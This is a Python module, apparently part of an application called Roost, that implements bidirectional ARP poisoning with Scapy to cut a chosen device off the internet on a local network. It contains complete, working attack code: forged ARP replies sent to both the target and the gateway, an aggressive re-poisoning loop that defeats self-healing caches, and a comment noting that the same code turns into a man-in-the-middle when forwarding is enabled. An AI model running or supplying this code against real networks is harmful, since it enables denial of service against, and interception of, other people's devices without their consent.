"""
ARP Spoofer — cuts internet access for a device using classic bidirectional
ARP poisoning.

How the cut works (NetCut-style full block):
  - We poison the TARGET: an ARP reply telling it that gateway_ip lives at
    OUR mac (own_mac). The target now sends all internet-bound traffic to us.
  - We poison the GATEWAY: an ARP reply telling it that target_ip lives at
    OUR mac. The gateway now sends all return traffic for the target to us.
  - Host IP forwarding stays OFF (we never re-forward). Both directions of the
    target's traffic therefore terminate at our NIC and are dropped =
    a complete internet cut for that one device only.

We re-poison aggressively (initial burst + tight ~1s loop) so we keep winning
the race against the real gateway's legitimate (solicited) ARP replies, which
would otherwise let the target's cache self-heal.

CRITICAL: stop_spoof()/stop_all_spoofs() must be called on shutdown to restore
BOTH ARP caches, otherwise the target and the gateway stay poisoned.
"""
import re
import threading
import time
import logging
from typing import Dict
from backend.utils.mac_utils import normalize_mac

logger = logging.getLogger("roost.arp_spoofer")

_MAC_RE = re.compile(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$")

# Active spoof threads: mac_address -> (thread, stop_event)
_active: Dict[str, tuple] = {}
_lock = threading.Lock()

# A "null"/invalid MAC we must never use as an Ether source.
_INVALID_MACS = {"", "00:00:00:00:00:00", "FF:FF:FF:FF:FF:FF"}

# Re-poison cadence (seconds) and initial burst size.
_REPOISON_INTERVAL = 1.0
_INITIAL_BURST = 10
_RESTORE_BURSTS = 6
_RESTORE_SPACING = 0.2


def _is_valid_mac(mac: str) -> bool:
    """True if mac is a usable unicast MAC (12 hex digits, not null/broadcast)."""
    norm = normalize_mac(mac or "")
    if norm in _INVALID_MACS:
        return False
    # Require six hex octets — normalize_mac passes through unparseable input,
    # so a plain group-count check would accept junk like 'GG:GG:...'.
    return bool(_MAC_RE.match(norm))


def _scapy_mac(mac: str) -> str:
    """Return a lower-case colon-separated MAC for Scapy Ether/ARP fields."""
    return normalize_mac(mac).lower()


def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str,
                gateway_mac: str, own_mac: str, iface,
                stop_event: threading.Event):
    """
    Thread: bidirectionally poisons target<->gateway until stop_event is set,
    then restores both ARP caches.
    """
    try:
        from scapy.layers.l2 import Ether, ARP
        from scapy.sendrecv import sendp

        src = _scapy_mac(own_mac)            # our real NIC MAC (Ether src + hwsrc)
        tgt = _scapy_mac(target_mac)
        gw = _scapy_mac(gateway_mac)

        # Poison the TARGET: "gateway_ip is at OUR mac".
        poison_target = (
            Ether(src=src, dst=tgt) /
            ARP(op=2, psrc=gateway_ip, hwsrc=src, pdst=target_ip, hwdst=tgt)
        )
        # Poison the GATEWAY: "target_ip is at OUR mac".
        poison_gateway = (
            Ether(src=src, dst=gw) /
            ARP(op=2, psrc=target_ip, hwsrc=src, pdst=gateway_ip, hwdst=gw)
        )

        send_kwargs: dict = dict(verbose=False)
        if iface:
            send_kwargs["iface"] = iface

        # Aggressive initial burst to corrupt both caches immediately and beat
        # any in-flight legitimate replies.
        logger.info(
            f"ARP poison burst x{_INITIAL_BURST}: target {target_ip}/{tgt} and "
            f"gateway {gateway_ip}/{gw} both -> our mac {src}"
        )
        burst_fail = 0
        for _ in range(_INITIAL_BURST):
            try:
                sendp([poison_target, poison_gateway], **send_kwargs)
            except Exception as e:
                burst_fail += 1
                logger.warning(f"ARP poison burst send error: {e}")
        if burst_fail >= _INITIAL_BURST:
            logger.error(
                f"All {burst_fail} initial poison sends failed for {target_ip} "
                "— interface/Npcap likely misconfigured; cut will not work"
            )

        # Steady-state tight re-poison loop.
        consecutive_fail = 0
        while not stop_event.is_set():
            try:
                sendp([poison_target, poison_gateway], **send_kwargs)
                consecutive_fail = 0
            except Exception as e:
                consecutive_fail += 1
                # Surface persistent send failure rather than swallowing it.
                if consecutive_fail in (1, 5, 25):
                    logger.warning(
                        f"ARP poison send failing for {target_ip} "
                        f"(consecutive={consecutive_fail}): {e}"
                    )
            stop_event.wait(_REPOISON_INTERVAL)

        # Restore BOTH caches once we are told to stop.
        _restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, own_mac, iface)

    except Exception as e:
        logger.error(f"ARP spoof thread error: {e}", exc_info=True)


def _restore_arp(target_ip: str, target_mac: str, gateway_ip: str,
                 gateway_mac: str, own_mac: str, iface):
    """
    Repair both ARP caches with the REAL macs via gratuitous ARP replies.
    Frames are sourced from OUR NIC MAC (Ether src) to avoid switch MAC-flap /
    port-security drops, while the ARP payload advertises the correct hwsrc.
    """
    try:
        from scapy.layers.l2 import Ether, ARP
        from scapy.sendrecv import sendp

        src = _scapy_mac(own_mac)
        tgt = _scapy_mac(target_mac)
        gw = _scapy_mac(gateway_mac)

        # Tell the target the REAL gateway MAC.
        fix_target = (
            Ether(src=src, dst=tgt) /
            ARP(op=2, psrc=gateway_ip, hwsrc=gw, pdst=target_ip, hwdst=tgt)
        )
        # Tell the gateway the REAL target MAC.
        fix_gateway = (
            Ether(src=src, dst=gw) /
            ARP(op=2, psrc=target_ip, hwsrc=tgt, pdst=gateway_ip, hwdst=gw)
        )

        kwargs: dict = dict(verbose=False)
        if iface:
            kwargs["iface"] = iface

        for _ in range(_RESTORE_BURSTS):
            try:
                sendp([fix_target, fix_gateway], **kwargs)
            except Exception as e:
                logger.warning(f"ARP restore send error for {target_ip}: {e}")
            time.sleep(_RESTORE_SPACING)
        logger.info(
            f"ARP restored for {target_ip} (target<->gateway caches repaired)"
        )
    except Exception as e:
        logger.warning(f"ARP restore failed for {target_ip}: {e}")


def start_spoof(target_ip: str, target_mac: str) -> bool:
    """
    Start bidirectional ARP spoofing for a target device. Returns True if
    started, False (with a logged reason) otherwise.
    NOTE: call this from a thread (e.g. run_in_executor) — _get_mac does
    blocking Scapy I/O which must not run on the async event loop.
    """
    mac = normalize_mac(target_mac)
    # Fast optimistic check — but do NOT hold the lock across the blocking
    # gateway-MAC resolution below, or a concurrent unblock / shutdown restore
    # would stall behind a ~3s srp() and the dual ARP restore could be skipped.
    with _lock:
        if mac in _active:
            logger.debug(f"Already spoofing {mac}")
            return True

    try:
        from backend.services.network_info import (
            get_network_info, is_ip_forwarding_enabled,
        )
        from backend.services.arp_scanner import _resolve_scapy_iface
        net = get_network_info()

        # Safety: never spoof the gateway or our own device.
        if target_ip == net.gateway_ip or target_ip == net.own_ip:
            logger.warning(f"Refusing to spoof gateway/own IP: {target_ip}")
            return False

        # Our own MAC must be a real, valid MAC or every Ether src is junk.
        if not _is_valid_mac(net.own_mac):
            logger.error(
                f"Cannot start spoof for {target_ip}: own MAC is invalid "
                f"({net.own_mac!r}) — interface detection failed"
            )
            return False

        # Target MAC must be valid too (it is our L2 destination).
        if not _is_valid_mac(mac):
            logger.error(f"Cannot start spoof: target MAC is invalid ({target_mac!r})")
            return False

        # Resolve the correct Scapy interface OBJECT (never a bare string now).
        resolved_iface = _resolve_scapy_iface(net.interface, net.own_ip)
        if resolved_iface is None:
            logger.error(
                f"Cannot start spoof for {target_ip}: no usable network "
                f"interface resolved for {net.interface}/{net.own_ip}"
            )
            return False

        # If host IP forwarding is ON, our "cut" would actually forward the
        # target's traffic (MITM, not block). Warn loudly; diagnostics flags it.
        if is_ip_forwarding_enabled():
            logger.warning(
                "Host IP forwarding is ENABLED — the block may NOT cut internet "
                "(traffic would be forwarded). Disable IPEnableRouter / ICS."
            )

        # Resolve and VERIFY the gateway MAC before starting (blocking I/O).
        gateway_mac = _get_mac(net.gateway_ip, resolved_iface, own_mac=net.own_mac)
        if not _is_valid_mac(gateway_mac):
            logger.error(
                f"Cannot get gateway MAC for {net.gateway_ip} (got {gateway_mac!r}) "
                "— ensure Npcap is installed, the correct interface is selected, "
                "and Roost runs as Administrator. Aborting block."
            )
            return False

        logger.info(
            f"Starting bidirectional ARP spoof for {target_ip}/{mac}: "
            f"gateway {net.gateway_ip}/{gateway_mac}, our mac {net.own_mac}, "
            f"iface {resolved_iface}"
        )

        stop_event = threading.Event()
        thread = threading.Thread(
            target=_spoof_loop,
            args=(target_ip, mac, net.gateway_ip, gateway_mac,
                  net.own_mac, resolved_iface, stop_event),
            daemon=True,
            name=f"spoof-{mac}",
        )
        # Re-acquire the lock only to commit; bail if another caller won the race.
        with _lock:
            if mac in _active:
                logger.debug(f"Race: already spoofing {mac}")
                return True
            thread.start()
            _active[mac] = (thread, stop_event)
        logger.info(f"ARP spoof started: {mac} @ {target_ip}")
        return True
    except Exception as e:
        logger.error(f"start_spoof failed: {e}", exc_info=True)
        return False


def stop_spoof(target_mac: str) -> bool:
    """Stop ARP spoofing for a device and restore both ARP caches."""
    mac = normalize_mac(target_mac)
    with _lock:
        if mac not in _active:
            return False
        thread, stop_event = _active.pop(mac)
        stop_event.set()
    thread.join(timeout=5)
    logger.info(f"ARP spoof stopped: {mac}")
    return True


def stop_all_spoofs():
    """Stop all active ARP spoof threads. Call on application shutdown."""
    macs = list(_active.keys())
    logger.info(f"Stopping all {len(macs)} ARP spoof threads...")
    for mac in macs:
        stop_spoof(mac)


def is_spoofing(target_mac: str) -> bool:
    mac = normalize_mac(target_mac)
    with _lock:
        return mac in _active


def _get_mac(ip: str, iface, own_mac: str = "") -> str:
    """
    Get MAC address for an IP via ARP request.
    Uses explicit src MAC to avoid conf.iface loopback-adapter bug on Windows.
    """
    try:
        from scapy.layers.l2 import Ether, ARP
        from scapy.sendrecv import srp

        src = _scapy_mac(own_mac) if _is_valid_mac(own_mac) else None
        if src:
            pkt = Ether(src=src, dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=src, pdst=ip)
        else:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

        kwargs: dict = dict(timeout=3, verbose=False)
        if iface:
            kwargs["iface"] = iface
        answered, _ = srp(pkt, **kwargs)
        if answered:
            return normalize_mac(answered[0][1].hwsrc)
        return ""
    except Exception as e:
        logger.warning(f"_get_mac({ip}) failed: {e}")
        return ""
